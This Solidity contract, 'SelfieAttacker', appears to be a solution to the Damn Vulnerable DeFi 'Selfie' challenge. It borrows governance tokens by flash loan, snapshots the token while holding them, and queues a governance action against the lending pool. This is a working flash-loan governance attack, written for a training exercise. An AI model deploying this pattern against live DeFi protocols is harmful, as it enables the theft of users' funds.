// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./SelfiePool.sol";
import "./SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttacker {
    using Address for address;

    SimpleGovernance public governance;
    SelfiePool public pool;

    event ActionQueued(uint256 indexed actionId);

    constructor(address _governanceAddress, address _poolAddress) {
        governance = SimpleGovernance(_governanceAddress);
        pool = SelfiePool(_poolAddress);
    }

    function receiveTokens(address _tokenAddress, uint256 _borrowAmount)
        public
    {
        DamnValuableTokenSnapshot token = DamnValuableTokenSnapshot(
            _tokenAddress
        );
        token.snapshot();
        token.transfer(address(pool), _borrowAmount);
    }

    function queueAction(bytes calldata data) public {
        uint256 actionId = governance.queueAction(address(pool), data, 0);
        emit ActionQueued(actionId);
    }

    function getLoan(uint256 amount) external {
        pool.flashLoan(amount);
    }
}
